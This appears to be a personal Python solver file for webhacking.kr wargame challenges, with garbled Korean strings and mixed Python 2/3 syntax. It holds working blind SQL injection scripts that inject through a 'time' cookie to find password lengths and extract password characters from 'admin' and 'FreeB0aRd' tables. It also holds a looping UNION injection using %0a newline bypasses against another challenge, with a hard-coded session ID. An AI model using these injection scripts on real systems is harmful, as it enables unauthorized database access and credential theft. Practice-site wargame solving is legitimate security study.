
'''
import re, urllib
import urllib.request
 
my_session = "fca36526f085fed53e76dd2f2fa77703"
 
 
print("\nadmin ���̺��� ��й�ȣ ���̸� ã���ϴ�.")
 
for i in range(1, 5000):
    url = "http://webhacking.kr/challenge/web/web-02/"
    req = urllib.request.Request(url)
 
    req.add_header('Cookie',"time=1517168052 and (select length(password) from admin) = %d; PHPSESSID=%s" %(i, my_session))
    html = urllib.request.urlopen(req).read()
    # html = html.decode('utf-8')
    html_str = str(html)

    find_index = html_str.find("<!--2070-01-01 09:00:01-->")
    print("Ž���� �Դϴ�... \n��й�ȣ�� ���� : %d" %i, end='')
    
    if (find_index != -1):
        print(" ... ����")
        print("admin ���̺��� �н����� ���� : %d" %i)
        break;
    else:
        print(" ... ����")
 
 
print("\nFreeB0aRd ���̺��� ��й�ȣ ���̸� ã���ϴ�.")
 
for i in range(1, 10000):
    url = "http://webhacking.kr/challenge/web/web-02/"
    req = urllib.request.Request(url)
 
    req.add_header('Cookie',"time=1517168052 and (select length(password) from FreeB0aRd) = %d; PHPSESSID=%s" %(i, my_session))
    html = urllib.request.urlopen(req).read()
    # html = html.decode('utf-8')
    html_str = str(html)
 
    find_index = html_str.find("<!--2070-01-01 09:00:01-->")
 
    print("Ž���� �Դϴ�... \n��й�ȣ�� ���� : %d" %i, end='')
 
 
    if (find_index != -1) :
        print(" ... ����")
        print("FreeB0aRd ���̺��� �н����� ���� : %d" %i)
        break;
    else :
        print(" ... ����")
'''
'''
from http import client

conn = client.HTTPConnection('webhacking.kr', 80)

base = "/challenge/web/web-02/index.php"
tryList = []
awsList=[]
for i in range(48,126):
    tryList.append(i)

for i in range(1,13):
    for w in tryList:
        print(str(w))
        headers={'Cookie':'time=1543201000 and (select ascii(substring(password,'+str(i)+'1))from FreeB0aRd)='+str(w)+';PHPSESSID=fca36526f085fed53e76dd2f2fa77703;'}
        conn.request('GET',base,'',headers)
        res = conn.getresponse()
        resData=res.read()
        strRes = str(resData)
        if(strRes.find('<!--2070-01-01 09:00:00-->')==-1):
            awsList.append(str(w))
            break

#for i in wsList:
    #print i
    #print (chr(int(i)),end="")

conn.close()
'''

import requests, unicodedata,time
aaa=""
a=0
cookies = {'PHPSESSID': 'fca36526f085fed53e76dd2f2fa77703'}
while True:
    res = requests.get("http://webhacking.kr/challenge/web/web-07/index.php?val=-1)%0aunion%0aselect%0a(5-3", cookies=cookies)    
    a+=1
    time.sleep(0.1)
    print "�õ�Ƚ�� : {} , �����ڵ� : {} , ���: {}, ���� : {}".format(a,res.json, res.headers, res.content)
    if res.status_code != 406:
         print 'success'

#s_big_data = unicodedata.normalize('NFKD', big_data).encode('ascii','ignore')
#print '<!--' in res.text
#print res.__dict__


#if "<!--" in s_big_data:
#    print "True"
#else:
#    print "none"

